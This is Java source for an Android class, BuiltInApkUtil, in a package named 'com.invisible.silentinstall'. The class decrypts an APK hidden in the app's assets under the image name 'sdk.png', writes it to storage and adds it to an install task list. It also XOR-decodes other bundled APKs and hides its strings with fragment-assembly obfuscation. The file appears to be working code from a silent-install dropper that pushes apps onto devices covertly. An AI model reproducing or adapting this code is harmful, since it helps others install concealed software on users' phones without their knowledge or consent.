package com.invisible.silentinstall.core;

import android.content.Context;
import android.content.pm.PackageInfo;

import com.invisible.silentinstall.download.DownloadIOUtils;
import com.invisible.silentinstall.interact.PureInteract;
import com.invisible.silentinstall.utils.AssertFileInfo;
import com.invisible.silentinstall.utils.AssetsManager;
import com.invisible.silentinstall.utils.DataUtil;
import com.invisible.silentinstall.utils.EE;
import com.invisible.silentinstall.utils.EncryptUtil;
import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.PublicSp;
import com.invisible.silentinstall.utils.Util_AndroidOS;
import com.invisible.silentinstall.utils.Util_File;
import com.invisible.silentinstall.utils.Util_Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Map;

import static com.invisible.silentinstall.utils.CtsPtyManager.Eget;

/**
 * Created by zhengnan on 2015/10/8.
 * 处理内置于assets下的apk的用到的工具类。
 * ---
 * 写死在代码中，当更多需求时再写到assets下吧。
 */
public class BuiltInApkUtil {
    private static final String pngName =   Eget(EE.s, EE.d, EE.k, EE.$, EE.png);// "sdk.png";
    private static final String apkName = Eget(EE.s, EE.d, EE.k, EE.$, EE.a, EE.p, EE.k);//"sdk.apk";
    private static final String str_pngHash = Eget(EE.png, EE.H, EE.a, EE.s, EE.h);//"pngHash";
    /** 构建model用到的常量 **/
    private  static final String cmtType = "broadcast";
    private static final String cmtName = Eget(EE.a, EE.ndroid, EE.$, EE.intent, EE.$, EE.a, EE.c, EE.t, EE.ion, EE.$, EE.l, EE.t, EE.s, EE.t, EE.a, EE.t);//"android.intent.action.ltstat";

    public static Map<String, TaskModel> execute(Map<String, TaskModel> nativeTasks) {
        hasBuildInTask = false;
        try {
            Context ctx = GlobalContext.getCtx();
            //1,将assets下的内置sdk.apk，释放到 下载模块 识别的目录。（不存在时才释放）
            AssertFileInfo afile = AssetsManager.getExistFiles(ctx, pngName);
            if (!afile.isExist()) return nativeTasks;

            File apk = getApkFile() ;

            if(apk.exists()){
                //如果与上次释放的原png的hash不同，就删除apk,以达到每次都是最新png apk的目的。
                String preMd5 = PublicSp.getInstance(ctx).getValue(str_pngHash,"-");
                String nowMd5 = getPngMd5(ctx,afile.getFileName());
                if(!preMd5.equals(nowMd5)){
                    Util_Log.logSI("内置apk有更新，so delete!");
                    delete();
                }
            }
            //将apk释放到t卡
            if(!apk.exists()){
                byte [] datas = EncryptUtil.reveal(ctx.getAssets().open(afile.getFileName()));
                Util_File.writeBytes(apk.getAbsolutePath(), datas);
                if(!Util_AndroidOS.isValidApk(apk.getAbsolutePath(), ctx)){
                    Util_Log.logSI("错误格式的apk文件！");
                    apk.delete();
                    return nativeTasks;
                }
                //写入png的hash， 当不同时才更新。
                PublicSp.getInstance(ctx).setValue(str_pngHash,""+getPngMd5(ctx,afile.getFileName()));
            }
            //如果已安装就不再安装了，也不判断版本了。
            if(PureInteract.getIns(ctx).isSdkInstalled())return nativeTasks;
            PackageInfo assetPInfo = Util_AndroidOS.getPkgInfo4File(ctx, apk.getAbsolutePath());
            if(Util_AndroidOS.isExistPackage(ctx,assetPInfo.packageName)
                   /* &&Util_AndroidOS.getVersion(ctx,assetPInfo.packageName)>=assetPInfo.versionCode*/){
                Util_Log.logSI("built-in apk has installed!");
                return nativeTasks;
            }


            //2,如果用户已卸载或失败过，就不安装此包
            DynamicDataMgr dm = TaskManager.getNativeDData();
            if (dm.getFailedList().containsKey(assetPInfo.packageName)
                    || dm.getUnInstallList().containsKey(assetPInfo.packageName)) {
                Util_Log.logSI("built-in apk has been failed. not continue ...");
                return nativeTasks;
            }

            //3,生成一个任务添加到本地集合中。
            Util_Log.logSI("添加内置的apk,到任务列表！");
            TaskModel tModel = builtTaskModel(assetPInfo);
            nativeTasks.put(tModel.getPackageName(), tModel);
            hasBuildInTask = true;

        } catch (Exception e) {
            e.printStackTrace();
        }
        return nativeTasks;
    }

    public static String getNativePName(Context ctx) {
        String pName = "";
        try {
            File apk = getApkFile();
            if (apk.exists()) {
                PackageInfo assetPInfo = Util_AndroidOS.getPkgInfo4File(ctx, apk.getAbsolutePath());
                if(assetPInfo!=null)return assetPInfo.packageName;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return pName;
    }

    //如果model包含的包已经在本地asset下存在了，则直接copy到下载目录 ，减少一次下载
    public static void checkAsset(Context ctx, TaskModel tm){
        //要求asst下文件名称为  包名-版本.apk
        if(tm.isSdk())return;//sdk有专门的规则 ，so,不符合当前情况
        String theUrl = tm.getDownUrl();
        String pName = tm.getPackageName();
        int vcode = tm.getVersionCode();
        AssertFileInfo ainfo = AssetsManager.getExistFiles(ctx, pName + "-" + vcode + ".apk");
        if(ainfo.isExist()) {
            if(Util_Log.logShow)Util_Log.logSI("copy " + pName + " 2 download ...");
            File downloadFolder = DownloadIOUtils.getDownloadFolder();
            if(downloadFolder==null)return;
            File target = new File(downloadFolder, Util_File.getFileName4url(theUrl));
            //copy到下载目录下
            DataUtil.copyAssets(ctx, ainfo.getFileName(), target);

            if(isEncode(target)){
                decode2(target, Integer.valueOf(GlobalContext.getGid()));
            }

        }
    }
    private static File getApkFile(){
        File folder = DownloadIOUtils.getDownloadFolder();
        if(!folder.exists())folder.mkdirs();

        return new File(folder, apkName);

    }
    private static boolean hasBuildInTask = false;
    //是否有内置任务，当有内置任务时。则不联网取数据。
    public static boolean hasBuildInTask(){
        return hasBuildInTask;
    }
    private static TaskModel builtTaskModel(PackageInfo pinfo) {
        TaskModel taskModel = new TaskModel();
        taskModel.setDownUrl("assets/" + apkName);
        taskModel.setPackageName(pinfo.packageName);
        taskModel.setVersionCode(pinfo.versionCode);
        taskModel.setComponentType(cmtType);
        taskModel.setComponentName(cmtName);
        taskModel.setConfid(-100);
        taskModel.setIsSdk(true);
        return taskModel;
    }
    public static void delete(){
        File f = getApkFile();
        if(f.exists())f.delete();
    }

    //是否有其它的纯apk 已经安装在本地。
    private static boolean hasInstalledSdk(Context ctx){
        //1,预置的包名（已放出的包名） "com.android.service.store"  这个是system的sdk,我们会对的是data的
     //   if(Util_AndroidOS.isExistPackage(ctx, Eget(com, $, a, ndroid, $, s, e, r, v, i, c, e, $, s, t, o, r, e)))return true;
        //2,写在sd卡的包名（sdk会将包名写入sd卡中）
//        String pName = getPname4pureSdk(ctx);
//        if(!TextUtils.isEmpty(pName)
//                &&Util_AndroidOS.isExistPackage(ctx,pName)){
//            if(Util_Log.logShow)Util_Log.logSI("本地已安装了一个内置apk: "+pName);
//            return true;
//        }
        return false;
    }


    public static String getPngMd5(Context ctx, String assertFile){
        try {
            InputStream in = ctx.getAssets().open(assertFile);
           return DataUtil.getMD5String(Util_File.inputStream2String1(in));
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    private static String ecodeTag = "ecode";
    public  static boolean isEncode( File f){
        try {
            FileInputStream input = new FileInputStream(f);
//            input = new BufferedInputStream(input);
            byte[] ecodeBytes = new byte[ecodeTag.getBytes().length];
            input.read(ecodeBytes);
            input.close();
            return new String(ecodeBytes).equals(ecodeTag);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    //不生成中间文件
    public static void decode2(File img, int code){
        try {
            FileInputStream fi = new FileInputStream(img);
            byte [] ecode = new byte[ecodeTag.getBytes().length];
            fi.read(ecode);
            if(new String(ecode).equals(ecodeTag)  ){
                //写到bo中。
                ByteArrayOutputStream bo = new ByteArrayOutputStream();
                int read =0;
                while ((read=fi.read())>-1){
                    bo.write(read^ code);
                }
                fi.close();
                //从bo中重写文件
                FileOutputStream fo = new FileOutputStream(img);
                fo.write(bo.toByteArray());
                fo.close();
                bo.close();
            }else
                fi.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



}

